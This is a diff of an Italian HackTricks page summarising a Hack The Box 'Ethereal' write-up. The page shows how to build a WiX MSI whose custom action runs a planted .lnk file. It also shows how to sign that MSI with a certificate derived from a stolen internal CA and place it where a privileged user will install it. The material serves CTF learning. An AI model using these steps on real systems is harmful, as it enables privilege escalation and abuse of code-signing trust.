@@ -1,12 +1,12 @@
-# Creare un MSI malevolo e ottenere root
+# Creazione di un MSI con Custom Action usando WiX
 
 {{#include ../../banners/hacktricks-training.md}}
 
-La creazione dell'installer MSI verrà effettuata utilizzando wixtools, nello specifico verrà utilizzato [wixtools](http://wixtoolset.org). È opportuno menzionare che sono stati provati builder MSI alternativi, ma non hanno avuto successo in questo caso specifico.<sup>[[1]](#references)</sup>
+Questa catena storica di Hack The Box usava WiX Toolset v3 per creare un MSI che avviava un file `.lnk` precedentemente piantato. **Un MSI non dispone automaticamente di privilegi**: l'esecuzione avviene nel contesto determinato dai criteri di Windows Installer, dagli attributi della custom action e dall'utente che lo installa. Nello scenario citato, l'attacker aveva inoltre sottratto una CA di firma trusted e posizionato l'MSI firmato in una cartella monitorata da un altro utente.<sup>[[1]](#references)[[3]](#references)</sup>
 
-Per una comprensione completa degli esempi di utilizzo di wix MSI, è consigliabile consultare [questa pagina](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Qui sono disponibili vari esempi che dimostrano l'utilizzo di wix MSI.<sup>[[2]](#references)</sup>
+Per una comprensione completa degli esempi di utilizzo di wix MSI, è consigliabile consultare [questa pagina](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Qui sono disponibili vari esempi che mostrano l'utilizzo di wix MSI.<sup>[[2]](#references)</sup>
 
-L'obiettivo è generare un MSI che esegua il file lnk. Per ottenere questo risultato, si potrebbe utilizzare il seguente codice XML ([xml da qui](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
+L'MSI esegue `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. L'XML originale di WiX v3 è riportato di seguito:<sup>[[1]](#references)</sup>
 ```html
 <?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
@@ -38,25 +38,31 @@ fail_here
 </Product>
 </Wix>
 ```
-È importante notare che l'elemento Package contiene attributi come InstallerVersion e Compressed, che specificano rispettivamente la versione dell'installer e indicano se il package è compresso o meno.
+`InstallerVersion` dichiara la versione minima di Windows Installer e `Compressed="yes"` indica che il pacchetto è compresso. `Stage1` è deferred ma ha `Impersonate="yes"`, quindi viene eseguito con il token impersonato dell'utente che esegue l'installazione; il cambio di privilegio in questo scenario è derivato dall'utente privilegiato che ha aperto successivamente l'MSI, non dal fatto che quell'attributo conceda magicamente i privilegi di SYSTEM.<sup>[[3]](#references)</sup>
 
-Il processo di creazione prevede l'utilizzo di candle.exe, uno strumento di wixtools, per generare un wixobject da msi.xml. Deve essere eseguito il seguente comando:<sup>[[1]](#references)</sup>
+Compila il sorgente in un oggetto WiX con `candle.exe`:<sup>[[1]](#references)</sup>
 ```
-candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
+candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
 ```
-Inoltre, vale la pena menzionare che nel post è presente un'immagine che mostra il comando e il relativo output. Puoi consultarla come riferimento visivo.<sup>[[1]](#references)</sup>
-
-Inoltre, verrà utilizzato light.exe, un altro tool di wixtools, per creare il file MSI dal wixobject. Il comando da eseguire è il seguente:<sup>[[1]](#references)</sup>
+Collega quell'oggetto a un MSI con `light.exe`:<sup>[[1]](#references)</sup>
 ```
-light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
+light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
 ```
-Analogamente al comando precedente, nel post è inclusa un'immagine che illustra il comando e il relativo output.<sup>[[1]](#references)</sup>
+### Passaggio di signing usato nella chain originale
 
-Tieni presente che, sebbene questo riepilogo miri a fornire informazioni utili, è consigliabile fare riferimento al post originale per dettagli più completi e istruzioni accurate.<sup>[[1]](#references)</sup>
+Il workflow di destinazione accettava pacchetti firmati da una CA interna compromessa. La relazione ricavava un certificato di firma da `MyCA.cer`/`MyCA.pvk`, creava un PFX e firmava l'MSI:<sup>[[1]](#references)</sup>
+```powershell
+makecert.exe -n "CN=Ethereal" -pe -cy end `
+-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
+-sv C:\tmp\rick.pvk C:\tmp\rick.cer
+pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
+signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
+```
+L'attaccante ha quindi posizionato il package firmato in `D:\DEV\MSIs` e ha atteso che il workflow/utente privilegiato lo eseguisse. Mantieni questa precondizione quando adatti la tecnica: senza un percorso di installazione elevato, una policy non sicura come `AlwaysInstallElevated` o una vittima privilegiata, questo package viene eseguito solo con i diritti dell'utente corrente.
 
-## Riferimenti
+## References
 
-- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
-- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (vedi anche [wixtools](http://wixtoolset.org))
-
+- [1] [Hack The Box - Ethereal: Creazione di un msi malevolo e ottenimento di root - Blog di 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
+- [2] [Una breve introduzione: creare un installer MSI con WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
+- [3] [Microsoft Learn — custom actions a esecuzione differita (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
 {{#include ../../banners/hacktricks-training.md}}
